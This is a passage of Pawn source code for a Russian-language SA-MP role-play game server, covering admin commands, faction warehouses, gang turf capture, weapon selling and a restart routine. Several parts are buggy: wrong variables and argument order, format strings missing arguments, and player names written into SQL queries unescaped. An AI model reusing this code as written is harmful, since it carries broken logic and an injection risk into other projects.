	{
		if(sscanf(params, "iii",params[1],params[2],params[3]) || params[1]  < 1 || params[1] > 5)
		{
		    SendClientMessage(playerid, CGREY, "Используйте: /givewarehouse [склад] [фракция] [кол-во]");
		    SendClientMessage(playerid, CGREY, "Склады: [ 1 - материалы фракции | 2 - наркотики фракции | 3 - деньги фракции | 4 - склад грузчиков | 5 - казна]");
			return SendClientMessage(playerid, CGREY, "Фракции: [ Смотри в /orgstat ]");
		}
		switch(params[1])
		{
			case 1..3:
			{
			    if((params[1] == 2 || params[1] == 3) && (params[2]!= F_GROVE && params[2]!= F_BALLAS && params[2]!= F_BIKERS && params[2] != F_AZTECAS && params[2] != F_VAGOS && params[2]!= F_LCN && params[2]!= F_YAKUZA && params[2]!= F_RM))
			    {
			        return SendClientMessage(playerid,CGREY,"Выдать наркотики и деньги можно только бандам и мафиям");
			    }
			    switch(params[1])
			    {
			        case 1:
					{
						FracMats[params[2]] += params[3];
						if(params[2]== F_GROVE || params[2]== F_BALLAS || params[2]== F_BIKERS || params[2] == F_AZTECAS || params[2] == F_VAGOS || params[2]== F_LCN || params[2]== F_YAKUZA || params[2]== F_RM) UpdateMat(params[2]);
						switch(params[2])
						{
						    case F_LSPD: SetMatsInt("lspdmats",FracMats[params[2]]);
							case F_LVPD: SetMatsInt("lvpdmats",FracMats[params[2]]);
							case F_FBI: SetMatsInt("fbimats",FracMats[params[2]]);
							case F_ARMY: SetMatsInt("armysamats",FracMats[params[2]]);
							case F_GROVE: SetMatsInt("grovemats",FracMats[params[2]]);
							case F_BALLAS: SetMatsInt("ballasmats",FracMats[params[2]]);
							case F_BIKERS: SetMatsInt("bikersmats",FracMats[params[2]]);
							case F_AZTECAS: SetMatsInt("aztecasmats",FracMats[params[2]]);
							case F_VAGOS: SetMatsInt("vagosmats",FracMats[params[2]]);
							case F_LCN: SetMatsInt("lcnmats",FracMats[params[2]]);
							case F_RM: SetMatsInt("rmmats",FracMats[params[2]]);
							case F_YAKUZA: SetMatsInt("triadmats",FracMats[params[2]]);
							case F_RIFA: SetMatsInt("rifamats",FracMats[params[2]]);
						}
						if(params[2] == F_ARMY) UpdateArmy();
					}
			        case 2:
					{
						FracDrugs[params[2]] += params[3],UpdateMat(params[2]);
						switch(params[2])
						{
						    case F_GROVE: SetMatsInt("grovedrugs",FracDrugs[params[2]]);
						    case F_BALLAS: SetMatsInt("ballasdrugs",FracDrugs[params[2]]);
						    case F_BIKERS: SetMatsInt("bikersdrugs",FracDrugs[params[2]]);
						    case F_AZTECAS: SetMatsInt("aztecasdrugs",FracDrugs[params[2]]);
						    case F_VAGOS: SetMatsInt("vagosdrugs",FracDrugs[params[2]]);
						    case F_LCN: SetMatsInt("lcndrugs",FracDrugs[params[2]]);
						    case F_RM: SetMatsInt("rmdrugs",FracDrugs[params[2]]);
						    case F_YAKUZA: SetMatsInt("triaddrugs",FracDrugs[params[2]]);
						    case F_RIFA: SetMatsInt("rifadrugs",FracDrugs[params[2]]);
						}
					}
			        case 3:
					{
						FracBank[params[2]] += params[3],UpdateMat(params[2]);
						switch(params[2])
						{
						    case F_GROVE: SetMatsInt("grovemoney",FracBank[params[2]]);
						    case F_BALLAS: SetMatsInt("ballasmoney",FracBank[params[2]]);
						    case F_BIKERS: SetMatsInt("bikersmoney",FracBank[params[2]]);
						    case F_AZTECAS: SetMatsInt("aztecasmoney",FracBank[params[2]]);
						    case F_VAGOS: SetMatsInt("vagosmoney",FracBank[params[2]]);
						    case F_LCN: SetMatsInt("lcnmoney",FracBank[params[2]]);
						    case F_RM: SetMatsInt("rmmoney",FracBank[params[2]]);
						    case F_YAKUZA: SetMatsInt("triadmoney",FracBank[params[2]]);
						    case F_RIFA: SetMatsInt("rifamoney",FracBank[params[2]]);
						}
					}
			    }
			}
			case 4: Prod+= params[3],SetMatsInt("prod",Prod),UpdProd();
			case 5: Kazna+= params[3],SetMatsInt("kazna",Prod);
		}
		SendClientMessage(playerid,-1,"Вы изменили склад");
	}
	return true;
}
CMD:giveskill(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /giveskill [id игрока]");
	PlayerInfo[params[0]][pGunSkill][0]=1000;
	PlayerInfo[params[0]][pGunSkill][1]=1000;
	PlayerInfo[params[0]][pGunSkill][2]=1000;
	PlayerInfo[params[0]][pGunSkill][3]=1000;
	PlayerInfo[params[0]][pGunSkill][4]=1000;
	PlayerInfo[params[0]][pGunSkill][5]=1000;
	SetPlayerSkills(params[0]);
	SendClientMessage(playerid,CREWARD,"Вы выдали все скиллы оружий игроку");
	static const fmt_string[] = "Администратор {f7ae11}%s{FFFFFF} выдал Вам все скиллы оружий";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
	SendClientMessage(params[0],-1,str);
	return 1;
}
CMD:setstat(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(FD1 || FD2)
	{
		if(sscanf(params, "uii", params[0],params[1],params[2]) || params[1]  < 1 || params[1] > 8)
		{
		    SendClientMessage(playerid, CGREY, "Используйте: /setstat [id игрока] [число] [кол-во]");
		    SendClientMessage(playerid, CGREY, "[ 1 - наличные | 2 - банк | 3 - донат | 4 - уровень | 5 - exp ]");
			return SendClientMessage(playerid, CGREY, "[ 6 - материалы | 7 - наркотики | 8 - сытость]");
		}
		if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
		new text[20];
		switch(params[1])
		{
		    case 1: GiveMoney(params[0],params[2]),text = "наличные деньги";
		    case 2: PlayerInfo[params[0]][pBank] += params[2],text = "деньги в банк";
		    case 3: PlayerInfo[params[0]][pDonate] += params[2],text = "донат";
		    case 4: PlayerInfo[params[0]][pLevel] = params[2],text = "уровень";
		    case 5: PlayerInfo[params[0]][pExp] += params[2],text = "exp",CheckLVL(params[0]);
		    case 6: PlayerInfo[params[0]][pMats] += params[2],text = "материалы",GiveInv(playerid,447,params[2]);
		    case 7: PlayerInfo[params[0]][pDrugs] += params[2],text = "наркотики",GiveInv(playerid,337,params[2]);
		    case 8: PlayerInfo[params[0]][pGolod] += params[2],text = "сытость";
		}
		static const fmt_stri1ng[] = "Игроку {f7ae11}%s{FFFFFF} Вы выдали {f7ae11}%s{FFFFFF}";
		new str1[sizeof(fmt_stri1ng)+MAX_PLAYER_NAME+20-2*2];
		format(str1, sizeof(str1), fmt_stri1ng,PlayerInfo[params[0]][pSendername],text);
	 	SendClientMessage(playerid,-1,str1);
		static const fmt_string[] = "Администратор {f7ae11}%s{FFFFFF} выдал Вам {f7ae11}%s{FFFFFF}";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+20];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],text);
	 	SendClientMessage(params[0],-1,str);
	}
	return true;
}


CMD:stopcapt(playerid)
{
    if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
    query = "";
    new str[144];
    for(new i = 0; i < 9; i++)
    {
		format(str,sizeof(str),"%s\t%s\n",FracInfo[i+6][fName],(CaptInfo[i][stop]) ? ("{F85A5A}[Запрещены]{FFFFFF}") : ("{20BA09}[Разрешены]{FFFFFF}"));
		strcat(query,str);
    }
    ShowPlayerDialog(playerid,476,DIALOG_STYLE_TABLIST,"Войны",query,"Далее","Отмена");
    
    return 1;
}
CMD:gzcolor(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /gzcolor [id фракции] ");
	if(params[0] < 6 || params[0] > 10 || params[0] == 16) return SendClientMessage(playerid,CGREY,"ID банд: 6 - Grove | 7 - Ballas | 9 - Aztecas | 10 - Vagos | 16 - Rifa");
	new full = 0;
	for(new i = 1;i<=TOTALGZ;i++)
	{
		if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
		{
			full++;
			GZInfo[i][gFrak] = params[0];
			GangZoneStopFlashForAll(GZInfo[i][id]);
			GangZoneHideForAll(GZInfo[i][id]);
			GangZoneShowForAll(GZInfo[i][id],GetGangZoneColor(GZInfo[i][gFrak]));
			query = "";
			format(query, 512, "UPDATE "TABLE_GANGZONE" SET gFrakVlad = %i WHERE gID = %i",params[0], i);
			mysql_tquery(mysql,query);
		}
	}
	if(full == 0) SendClientMessage(playerid, CGREY, "Вы должны находиться в гетто!");
	return 1;
}

stock Restart()
{
    SendClientMessageToAll(CLIGHTRED,"Рестарт сервера, перезайдите в игру");
	/*for(new i = 1;i <= TOTALKV; i++)
	{
		format(query, sizeof(query), "UPDATE "TABLE_KV" SET name = '%s', oplata = '%i' WHERE id = '%d' LIMIT 1", KvInfo[i][kOwner],KvInfo[i][kOplata],i);
		mysql_tquery(mysql,query);
	}*/
	for(new i = 0;i<MAX_PLAYERS;i++)
	{
	    if(IsPlayerConnected(i))
		{
			if(PlayerLogged[i] == true) SaveAccount(i);
			Kick(i);
		}
	}
	for(new i = 1; i <= TOTALBIZ; i++)
	{
	    query = "";
		format(query, sizeof(query), "UPDATE `biz` SET `owner` = '%s',`mafia` = %i,`money` = %i,`prod` = %i,`zeml` = %i, `vhod` = %i,`ohr` = %i,`ul1` = %i,`ul2` = %i,`ul3` = %i,`menedger` = '%s',`ul4` = %i,`ul5` = %i  WHERE id = '%d' LIMIT 1",BizInfo[i][bOwner],BizInfo[i][bMafia],BizInfo[i][bMoney],BizInfo[i][bTill],BizInfo[i][bZeml],BizInfo[i][bVhod],BizInfo[i][bOhr],BizInfo[i][bUl][0],BizInfo[i][bUl][1],BizInfo[i][bUl][2],BizInfo[i][bMen],BizInfo[i][bUl][3],BizInfo[i][bUl][4],i);
		mysql_tquery(mysql,query);
	}
	for(new i = 1; i <= TOTALHOUSE; i++)
	{
	    query = "";
		format(query, sizeof(query), "UPDATE testhouse SET hOwner = '%s',hOplata = %i,`ul1` = %i,`ul2` = %i,`ul3` = %i WHERE id = '%d' LIMIT 1",HInfo[i][hOwner],HInfo[i][hOplata],i,HInfo[i][hUl][0],HInfo[i][hUl][1],HInfo[i][hUl][2]);
		mysql_tquery(mysql,query);
	}
	for(new i = 1; i <= TOTALV; i++)
	{
	    query = "";
	    format(VInfo[i][vtunings], 100, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
		VInfo[i][vtuning][0],VInfo[i][vtuning][1],VInfo[i][vtuning][2],
		VInfo[i][vtuning][3],VInfo[i][vtuning][4],VInfo[i][vtuning][5],
		VInfo[i][vtuning][6],VInfo[i][vtuning][7],VInfo[i][vtuning][8],
		VInfo[i][vtuning][9],VInfo[i][vtuning][10],VInfo[i][vtuning][11],
		VInfo[i][vtuning][12],VInfo[i][vtuning][13]);
		format(query, sizeof(query), "UPDATE veh SET name = '%s',model = %i, oplata = %i, prob = %i, tuning = '%s',color1 = %d, color2 = %d,fuel = %d  WHERE id = '%d' LIMIT 1",VInfo[i][vname],VInfo[i][vmodel],VInfo[i][voplata],VInfo[i][vprob],VInfo[i][vtunings],VInfo[i][vcolor1],VInfo[i][vcolor2],Fuel[VInfo[i][vcar]],i);
		mysql_tquery(mysql,query);
	}
	for(new i = 0; i <= TOTALVEH; i++)
	{
	    query = "";
        format(query, sizeof(query), "UPDATE vehicle SET model = %i, cost = %i, fuel = %i WHERE id = '%d' LIMIT 1",VehInfo[i][vModel],VehInfo[i][vCost],Fuel[VehInfo[i][vVehicle]],i);
		mysql_tquery(mysql,query);
	}
	mysql_close();
	SendRconCommand("gmx");
	return 1;
}
CMD:restart(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
	if(FD1 || FD2) Restart();
	return true;
}
CMD:gotp(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(gtp == 0) return SendClientMessage(playerid,CGREY,"Телепорт закрыт!");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGREY,"Вы в транспорте");
	if(GetPlayerInterior(playerid) || GetPlayerVirtualWorld(playerid)) return SendClientMessage(playerid,CGREY,"Телепортироваться можно только с улицы");
	gtph--;
	SetPlayerPos(playerid,PlX+random(3) ,PlY+random(3), PlZ+2);
	SetPlayerFacingAngle(playerid,PANGLE);
	SetPlayerInterior(playerid,avirt);
	SetPlayerVirtualWorld(playerid,aint);
	SendClientMessage(playerid, CREWARD, "Вы телепортировались");
	if(gtph <= 0) gtp = 0,SendClientMessageToAll(CREWARD,">> Телепорт к администратору закрыт <<");
	return true;
}

CMD:sellgun(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(IsAGang(playerid) || IsAMafia(playerid))
	{

		new id1,pt,cena;
		if(sscanf(params, "uiis[20]", id1,pt,cena,params)) return SendClientMessage(playerid, CGREY, "Используйте: /sellgun [id игрока] [патроны] [цена] [оружие]");
		if(cena < 1 || cena > 100000) return SendClientMessage(playerid,CGREY,"Вы не можете продать меньше чем за $1");
		if(pt < 1) return SendClientMessage(playerid,CGREY,"Вы не можете продать меньше 1 пт");
		new full1 = 0;
		if(!strcmp(params, "deagle", true)) SetPVarInt(id1,"GunM",24), full1 = 1;
		else if(!strcmp(params, "silenced", true)) SetPVarInt(id1,"GunM",23), full1 = 1;
		else if(!strcmp(params, "shotgun", true)) SetPVarInt(id1,"GunM",25), full1 = 1;
		else if(!strcmp(params, "mp5", true)) SetPVarInt(id1,"GunM",29), full1 = 1;
		else if(!strcmp(params, "m4", true)) SetPVarInt(id1,"GunM",31), full1 = 1;
		else if(!strcmp(params, "ak47", true)) SetPVarInt(id1,"GunM",30), full1 = 1;
		if(full1 == 0)
		{

			SendClientMessage(playerid,CGREY,"Данного оружия не существует.Оружия: Deagle,Silenced,ShotGun,MP5,M4,AK47");
			DeletePVar(params[0],"GunM");
			return true;
		}
		if(PlayerInfo[playerid][pMats] < GetPVarInt(playerid,"GunM")*pt/5 || !PlayerInfo[playerid][pMats])
		{
		    DeletePVar(id1,"GunM");
			return SendClientMessage(playerid,CGREY,"У вас недостаточно материалов");
		}
		if(id1 != playerid)
		{

			if(GetPred(id1) == 1)
			{
                DeletePVar(id1,"GunM");
				return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
			}
			if(PlayerInfo[id1][pLevel] < 2)
			{
			    DeletePVar(id1,"GunM");
			    return SendClientMessage(playerid, CGREY, "Вы не можете продать это игоку с 1 уровнем");
			}
			new Float:x,Float:y,Float:z;
	 		GetPlayerPos(id1,x,y,z);
	   		if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
	   		{
				DeletePVar(id1,"GunM");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
			SetPVarInt(id1,"GunID",playerid);
			SetPVarInt(id1,"GunPT",pt);
			SetPVarInt(id1,"GunCena",cena);
			new gunname[32];
			GetWeaponName(GetPVarInt(id1,"GunM"),gunname,sizeof(gunname));
			SendClientMessage(playerid,CREWARD,"Вы предложили игроку купить оружие");
			static const fmt_string1[] = "%s предложил Вам купить %s(%i патронов). Цена: $%i";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+50];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],gunname,pt,cena);
			SendClientMessage(id1,0xFF7F50FF,str1);
			SendClientMessage(id1,CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
		}
		else
		{
			if(GetFree(playerid,GiveID(GetPVarInt(playerid,"GunM")),pt)) return SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
			
			PlayerInfo[playerid][pMats] -= GetPVarInt(playerid,"GunM")*pt/5;
			GiveInv(playerid,447,GetPVarInt(playerid,"GunM")*pt/5);
			//GivePlayerWeapon(playerid,GetPVarInt(playerid,"GunM"),pt);
			static const fmt_string[] = "%s сделал оружие из материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+64];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "сделал оружие из материалов", COLOR_PURPLE, 30.0, 7000);
			DeletePVar(playerid,"GunM");
		}
	}
	return true;
}
CMD:payday(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(FD1 || FD2) PayDayGo();
	return true;
}
CMD:piss(playerid)
{
    SetPlayerSpecialAction(playerid, 68);
    SetPVarInt(playerid,"AnimGo",1);
	ShowInfo(playerid,"STOP Animation press H");
	return 1;
}
CMD:animlist(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
    if(sscanf(params, "i", params[0]) || params[0] < 1 || params[0] > 64)
    {
	    new stringiser[1180];
		new Animser[][] = {
			{"1. Танец - 1\n2. Танец - 2\n3. Танец - 3\n4. Танец - 4\n5. Стойка дилера\n6. Передал что-то\n7. Съел что-то\n8. Справить нужду\n9. Медитация\n10. Сидеть раненым\n11. Спать на боку\n12. Лечь на спину\n13. Шлепнуть рукой\n14. Наносить граффити 1\n15. Наносить граффити 2\n16. Курение\n17. Ограбление\n18. Одеть маску\n19. Руки в верх\n20. Позвать кого-то\n21. Поднять руки\n22. Болельщик 1\n23. Болельщик 2\n24. Болельщик 3\n"},
			{"25. Показать средний палец\n26. Выпить что-то\n27. Махать руками\n28. Мужское курение\n29. Прилечь 1\n30. Прилечь 2\n31. Прилечь 3\n32. Прилечь 4\n33. Присесть на пол\n34. Читать реп 1\n35. Читать реп 2\n36. Читать реп 3\n37. Читать реп 4\n38. Набивать мяч\n39. Кинуть мяч\n40. Поднять мяч\n41. Позвать\n42. Чинить авто\n43. Прислониться к авто\n44. Сложить руки вместе\n"},
			{"45. Держать биту 1\n46. Держать биту 2\n47. Гангстерский жест 1\n48. Гангстерский жест 2\n49. Гангстерский жест 3\n50. Гангстерский жест 4\n51. Гангстерский жест 5\n52. Гангстерский жест 6\n53. Гангстерский жест 7\n54. Гангстерский жест 8\n55. Плакать\n56. Присесть 1\n57. Присесть 2\n58. Присесть облокотившись\n59. Женское курение\n60. Искусственное дыхание\n61. Облокотится\n62. Облокотится 2\n63. Facepalm\n64. Чесаться"}
		};
		stringiser = "";
		format(stringiser, sizeof(stringiser), "%s%s%s", Animser[0], Animser[1], Animser[2]);
		return  ShowPlayerDialog(playerid,127,DIALOG_STYLE_LIST, "Список анимаций", stringiser, "Выбрать", "Отмена");
	}
	GoAnim(playerid,params[0]);
	return true;
}
CMD:anim(playerid, params[]) return cmd_animlist(playerid,params);
CMD:bizlist(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(IsAMafia(playerid))
	{
		new str[90], str2[512],kek = 0;
		strcat(str2, "{ffffff}[#] Бизнес | Прибыль\n\n");
		for(new i = 1; i <= TOTALBIZ; i++)
		{
			if(BizInfo[i][bMafia] == PlayerInfo[playerid][pMember])
			{
				format(str,sizeof(str),"[%i] %s | %i\n",kek,BizInfo[i][bName],BizInfo[i][bMafiaM]);
				strcat(str2, str);
				kek++;
			}
		}
		if(kek == 0) return SendClientMessage(playerid,CGREY,"У Вашей мафии нет бизнесов");
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Бизнесы мафии",str2,"Назад","");
	}
	else SendClientMessage(playerid,CGREY,"Вам не доступна данная команда");
	return true;
}
CMD:capture(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(IsAGang(playerid))
	{
	    if(GetPVarInt(playerid,"AntiFlood1") > gettime()) return SendClientMessage(playerid, CGREY, "Не флуди!");
	   
	    
	    SetPVarInt(playerid,"AntiFlood1",gettime() + 2);
	    if(PlayerInfo[playerid][pRank] < 8) return SendClientMessage(playerid,CGREY,"Захват зон доступен с 8 ранга");
	    
		new h,m,c;
		gettime(h,m,c);
		if(h < 10 || h > 22) return SendClientMessage(playerid,CGREY,"Захват территорий происходит с 15:00 до 22:00");
		if(h == 13 || h == 18 || h == 21)  return SendClientMessage(playerid,CGREY,"Нельзя воевать за полчаса до поезд и полчаса после!");
		if(FracInfo[PlayerInfo[playerid][pMember]][fCapt] > gettime()) return SendClientMessage(playerid,CGREY,"Захвать территории можно спустя 30 минут после окончания предыдущей войны!");
		if(GetOnline(PlayerInfo[playerid][pMember]) < 3) return SendClientMessage(playerid,CGREY,"Вы не можете начать воевать, если у Вас нет более 3 игроков в сети");
		new playerfrac = PlayerInfo[playerid][pMember]-6;
		if(CaptInfo[playerfrac][stop]) return SendClientMessage(playerid,CGREY,"Администрация Вам запретила воевать!");
		if(CaptInfo[playerfrac][capture] > 0) return SendClientMessage(playerid,CGREY,"Ваша организация уже захватывает территорию");
        static const fmt_string1[] = "[F] %s напали на %s. Войну начал: %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+30+30];
  		for(new i = 1;i<=TOTALGZ;i++)
		{
			if(!PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]) || ZoneBat[i]) continue;
			if(i == 9 || i == 30 || i == 44 || i == 13) continue;
			if(GetOnline(GZInfo[i][gFrak]) < 3) return SendClientMessage(playerid,CGREY,"Вы не можете нападать на организацию, у которой нет 3 игроков в сети");
            new gzfrac = GZInfo[i][gFrak]-6;
            if(CaptInfo[gzfrac][stop]) return SendClientMessage(playerid,CGREY,"Администрация запретила организации воевать!");
			if(FracInfo[GZInfo[i][gFrak]][fCapt]) return SendClientMessage(playerid,CGREY,"Организация уже воевала в этом часу");
		    if(GZInfo[i][gFrak] == PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Вы не можете захватывать зону вашей организации");
		    if(CaptInfo[gzfrac][gangnumber] > 0 ) return SendClientMessage(playerid,CGREY,"Организация, держащая данную зону, уже сражается за одну из других зон");
		    if(GZInfo[i][gCapture] == 1) return SendClientMessage(playerid, CGREY, "Данную зону уже захватывают");
		    if(!PlayerInfo[playerid][pQuestS][9])
			{
				PlayerQuest[playerid][9][0]++;
				CheckQuest(playerid,9);
			}
	    	PlayerInfo[playerid][pCrimeStats][C_CAPTURE]++;
			format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],FracInfo[GZInfo[i][gFrak]][fName],PlayerInfo[playerid][pSendername]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str1);
			SendAdminMessage(CGREY,str1);
			SendFMes(GZInfo[i][gFrak],COLOR_SKLAD,str1);
			CaptInfo[playerfrac][capture] = GZInfo[i][gFrak];
			CaptInfo[gzfrac][capture] = PlayerInfo[playerid][pMember];
			CaptInfo[playerfrac][gangnumber] = 1;
			CaptInfo[gzfrac][gangnumber] = 2;
			CaptInfo[gzfrac][terid] = i;
			CaptInfo[playerfrac][terid] = i;
			CaptInfo[gzfrac][score] = 0;
			CaptInfo[playerfrac][score] = 0;
			FracInfo[PlayerInfo[playerid][pMember]][fCapt] = gettime()+60*40;
			FracInfo[GZInfo[i][gFrak]][fCapt] = gettime()+60*40;
			GZSafeTime[i] = 600; //600
			ZoneBat[i] = 1;
			GZInfo[i][gNapad] =  PlayerInfo[playerid][pMember];
			GangZoneFlashForAll(GZInfo[i][id],GetGangZoneColor(PlayerInfo[playerid][pMember]));
			for(new k = 0; k < MAX_PLAYERS; k++)
			{
			    if(!IsPlayerConnected(k) || PlayerLogged[k] == false) continue;
			    if(PlayerInfo[k][pMember] == PlayerInfo[playerid][pMember] || PlayerInfo[k][pMember] == GZInfo[i][gFrak]) CaptGo(k);
			}
		}
	}
	else SendClientMessage(playerid,CGREY,"Вам не доступна данная команда");
	return true;
}
CMD:delv(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
    if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /delv [id]");
 	DestroyVehicle(params[0]);
	return true;
}
CMD:select(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
 	SelectObject(playerid);
	return true;
}

CMD:cpick(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	new Float:x, Float:y, Float:z;
	if(sscanf(params, "ii", params[0],params[1])) return SendClientMessage(playerid, -1, "Используйте: /cpick [тип пикапа] [орг]");
	GetPlayerPos(playerid, x, y, z);
	format(coordc, sizeof(coordc), "%f, %f, %f, %d, 1, %d, %d, %d", x, y, z, params[0], GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),params[1]);
	SendClientMessage(playerid, -1, "Координаты созданы. Установите выходные координаты: /ppc");
	return true;
}
CMD:ppc(playerid,params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	new Float:x, Float:y, Float:z, Float:fa;
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, fa);
	TOTALENTERS++;
	sscanf(coordc,"p<,>fffddddd",
	EntersInfo[TOTALENTERS][pX], EntersInfo[TOTALENTERS][pY],EntersInfo[TOTALENTERS][pZ], EntersInfo[TOTALENTERS][pM],
	EntersInfo[TOTALENTERS][pT],EntersInfo[TOTALENTERS][pI], EntersInfo[TOTALENTERS][pV],EntersInfo[TOTALENTERS][pMem]);
	query = "";
	format(query, sizeof(query), "INSERT INTO "TABLE_ENTERS" (x, y, z, m, t, i, v, tx, ty, tz, tfa, ti, tv, m1) VALUES ('%f', '%f', '%f', %d, %d, %d, %d, '%f', '%f', '%f', '%f', %d, %d, %d)",
	EntersInfo[TOTALENTERS][pX], EntersInfo[TOTALENTERS][pY],EntersInfo[TOTALENTERS][pZ],EntersInfo[TOTALENTERS][pT], EntersInfo[TOTALENTERS][pM],
	EntersInfo[TOTALENTERS][pI], EntersInfo[TOTALENTERS][pV],x,y,z,fa,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),EntersInfo[TOTALENTERS][pMem]);
	EntersInfo[TOTALENTERS][pP] = CreateDynamicPickup(EntersInfo[TOTALENTERS][pT],23, EntersInfo[TOTALENTERS][pX], EntersInfo[TOTALENTERS][pY], EntersInfo[TOTALENTERS][pZ], EntersInfo[TOTALENTERS][pV]);
	mysql_tquery(mysql,query);
	SendClientMessage(playerid, -1, "Пикап номер создан");
	return true;
}

function GMTest(playerid, gmplayer, Float: oldhealth)
{
	new Float: newhealth;
	GetPlayerHealth(gmplayer, newhealth);
	new mes[235],nsa[70];
	if(oldhealth == newhealth) nsa = "{FF0000}Возможно игрок использует God Mode(GM)";
	if(oldhealth != newhealth) nsa = "{04FF00}Вероятно игрок чист, показатель его HP уменьшился";
	format(mes, sizeof(mes),"{FFFFFF}Проверка игрока:\t{f7ae11}%s[%d]\n{FFFFFF}До теста:\t\t{f7ae11}%.0f.0 (HP)\n{FFFFFF}После теста:\t\t{f7ae11}%.0f.0 (HP)\n{FFFFFF}Уменьшилось на:\t{f7ae11}%.0f.0 (HP)\n\n%s",PlayerInfo[gmplayer][pSendername],gmplayer,oldhealth,newhealth,oldhealth-newhealth, nsa);
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX,"Тест на GM",mes,"Далее","");
	SetPlayerHealth(gmplayer, oldhealth);
	return true;
}
CMD:fm(playerid, params[])
{
    if(!PlayerInfo[playerid][pAcs][4]) return SendClientMessage(playerid,CGREY,"У Вас нет наушников или они не надеты! Купить их можно в магазине аксессуаров.");
    ShowPlayerDialog(playerid,413,DIALOG_STYLE_LIST,"Радио","1 | Europa Plus\n2 | Radio Record\n3 | Radio PremiuM\n4 | Radio ZaycevFM\n5 | Выключить радио","Далее","Отмена");
	return 1;
}
CMD:time(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	new string[100];
	if(!PlayerInfo[playerid][pAcs][2])
	{
	    if(PlayerInfo[playerid][pJailTime])
	    {
	        format(string, sizeof(string), "~r~Jail %d min",PlayerInfo[playerid][pJailTime]/60);
	        GameTextForPlayer(playerid, string, 5000, 1);
	    }
	    else SendClientMessage(playerid,CGREY,"У Вас нет часов или они не надеты! Купить их можно в магазине аксессуаров.");
		return 1;
	}
	new mtext[20];
	new year, month,day;
	getdate(year, month, day);
	switch(month)
	{
	    case 1: mtext = "January";
	    case 2: mtext = "February";
	    case 3: mtext = "March";
	    case 4: mtext = "April";
	    case 5: mtext = "May";
	    case 6: mtext = "June";
	    case 7: mtext = "Juli";
	    case 8: mtext = "August";
	    case 9: mtext = "September";
	    case 10: mtext = "October";
	    case 11: mtext = "November";
	    case 12: mtext = "December";
	}
	new hour,minuite,second;
	gettime(hour,minuite,second);
	if (PlayerInfo[playerid][pJailTime] > 0) format(string, sizeof(string), "~b~%d %s~n~~w~%02d:%02d~n~Played for an hour %i min~n~~r~Jail %d min", day, mtext,PlayerInfo[playerid][pMin], PlayerInfo[playerid][pJailTime]/60);
	else format(string, sizeof(string), "~b~%d %s~n~~w~%02d:%02d~n~Played for an hour %i min", day, mtext,PlayerInfo[playerid][pMin]);
	GameTextForPlayer(playerid, string, 5000, 1);
